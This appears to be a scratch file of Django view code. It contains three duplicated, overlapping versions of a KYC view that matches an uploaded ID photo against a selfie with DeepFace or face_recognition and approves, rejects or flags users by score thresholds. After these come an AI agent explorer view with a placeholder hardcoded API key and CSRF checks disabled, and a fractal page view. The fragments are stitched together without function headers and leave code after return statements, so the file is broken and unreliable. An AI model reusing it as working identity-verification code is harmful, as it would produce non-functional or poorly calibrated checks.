            kyc = KYCVerification(user=request.user, id_photo=id_photo, selfie=selfie)
            kyc.save()

            # Handle ID photo (PDF or image)
            id_file_path = kyc.id_photo.path
            if id_file_path.lower().endswith('.pdf'):
                doc = fitz.open(id_file_path)
                page = doc.load_page(0)  # First page
                pix = page.get_pixmap()
                id_image_path = id_file_path.replace('.pdf', '.jpg')
                pix.save(id_image_path)
                doc.close()
            else:
                id_image_path = id_file_path

            # Process selfie
            selfie_path = kyc.selfie.path
            
            try:
                # Verify faces with DeepFace
                result = DeepFace.verify(
                    img1_path=id_image_path,
                    img2_path=selfie_path,
                    model_name='ArcFace',  # Or 'FaceNet', 'Dlib', etc.
                    detector_backend='retinaface'  # More accurate than default
                )
                similarity_score = result['distance'] * 100  # Convert to percentage-like score
                kyc.similarity_score = 100 - similarity_score  # Higher is better
                
                if kyc.similarity_score > 85:
                    kyc.status = 'approved'
                elif kyc.similarity_score < 60:
                    kyc.status = 'rejected'
                else:
                    kyc.status = 'manual_review'
            except Exception as e:
                kyc.status = 'rejected'
                print(f"Error during verification: {e}")
            
            # Clean up temporary image (if PDF)
            if id_file_path.lower().endswith('.pdf') and os.path.exists(id_image_path):
                os.remove(id_image_path)
            
            kyc.save()
            return render(request, 'kyc/result.html', {'kyc': kyc})
    
    return render(request, 'kyc/upload.html')
    if request.method == 'POST':
        id_photo = request.FILES.get('id_photo')
        selfie = request.FILES.get('selfie')
        
        if id_photo and selfie:
            kyc = KYCVerification(user=request.user, id_photo=id_photo, selfie=selfie)
            kyc.save()

            # Handle ID photo (PDF or image)
            id_file_path = kyc.id_photo.path
            if id_file_path.lower().endswith('.pdf'):
                # Convert PDF to image
                try:
                    images = pdf2image.convert_from_path(id_file_path)
                    id_image = images[0]  # Use first page
                    id_image_path = id_file_path.replace('.pdf', '.jpg')
                    id_image.save(id_image_path, 'JPEG')
                except Exception as e:
                    kyc.status = 'rejected'
                    kyc.save()
                    print(f"PDF conversion error: {e}")
                    return render(request, 'kyc/result.html', {'kyc': kyc})
            else:
                id_image_path = id_file_path  # Use original image if not PDF

            # Process selfie
            selfie_path = kyc.selfie.path
            
            try:
                # Load and encode faces
                id_image = face_recognition.load_image_file(id_image_path)
                selfie_image = face_recognition.load_image_file(selfie_path)
                
                id_face_encodings = face_recognition.face_encodings(id_image)
                selfie_face_encodings = face_recognition.face_encodings(selfie_image)
                
                if id_face_encodings and selfie_face_encodings:
                    match = face_recognition.compare_faces(
                        [id_face_encodings[0]], selfie_face_encodings[0]
                    )[0]
                    distance = face_recognition.face_distance(
                        [id_face_encodings[0]], selfie_face_encodings[0]
                    )[0]
                    similarity_score = max(0, 100 - (distance * 100))
                    
                    kyc.similarity_score = similarity_score
                    if similarity_score > 90:
                        kyc.status = 'approved'
                    elif similarity_score < 70:
                        kyc.status = 'rejected'
                    else:
                        kyc.status = 'manual_review'
                else:
                    kyc.status = 'rejected'
            except Exception as e:
                kyc.status = 'rejected'
                print(f"Error during face recognition: {e}")
            
            # Clean up temporary image (if PDF)
            if id_file_path.lower().endswith('.pdf') and os.path.exists(id_image_path):
                os.remove(id_image_path)
            
            kyc.save()
            return render(request, 'kyc/result.html', {'kyc': kyc})
    
    return render(request, 'kyc/upload.html')
    if request.method == 'POST':
        id_photo = request.FILES.get('id_photo')
        selfie = request.FILES.get('selfie')
        
        if id_photo and selfie:
            # Save the KYC data
            kyc = KYCVerification(user=request.user, id_photo=id_photo, selfie=selfie)
            kyc.save()

            # Load images for facial recognition
            id_image_path = kyc.id_photo.path
            selfie_path = kyc.selfie.path
            
            try:
                # Load and encode faces
                id_image = face_recognition.load_image_file(id_image_path)
                selfie_image = face_recognition.load_image_file(selfie_path)
                
                id_face_encodings = face_recognition.face_encodings(id_image)
                selfie_face_encodings = face_recognition.face_encodings(selfie_image)
                
                if id_face_encodings and selfie_face_encodings:
                    # Compare faces (returns True/False for match)
                    match = face_recognition.compare_faces(
                        [id_face_encodings[0]], selfie_face_encodings[0]
                    )[0]
                    
                    # Calculate distance for a similarity score (lower distance = better match)
                    distance = face_recognition.face_distance(
                        [id_face_encodings[0]], selfie_face_encodings[0]
                    )[0]
                    similarity_score = max(0, 100 - (distance * 100))  # Rough conversion to percentage
                    
                    kyc.similarity_score = similarity_score
                    if similarity_score > 90:
                        kyc.status = 'approved'
                    elif similarity_score < 70:
                        kyc.status = 'rejected'
                    else:
                        kyc.status = 'manual_review'
                else:
                    kyc.status = 'rejected'  # No faces detected
            except Exception as e:
                kyc.status = 'rejected'
                print(f"Error during face recognition: {e}")
            
            kyc.save()
            return render(request, 'kyc/result.html', {'kyc': kyc})
    
    return render(request, 'kyc/upload.html')





import openai
import json
from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.contrib.auth.decorators import login_required

# Load OpenAI API Key (Ensure your .env file contains OPENAI_API_KEY)
openai.api_key = "your_openai_api_key"

@login_required
def agent_explorer_page(request):
    """Render the AI Agent Explorer HTML page."""
    return render(request, "agent_explorer.html")

@csrf_exempt
@login_required
def agent_explorer_api(request):
    if request.method == "GET":
        return JsonResponse({"message": "Agent Explorer API is working. Use POST to send messages."})

    if request.method == "POST":
        # Process OpenAI request (as above)
        ...
        
from django.shortcuts import render

def fractal_view(request):
    context = {
        'title': 'Infinite Zoom Mandelbrot',
        'description': 'Zoom infinitely into the Mandelbrot set using your mouse!',
    }
    return render(request, 'fractal.html', context)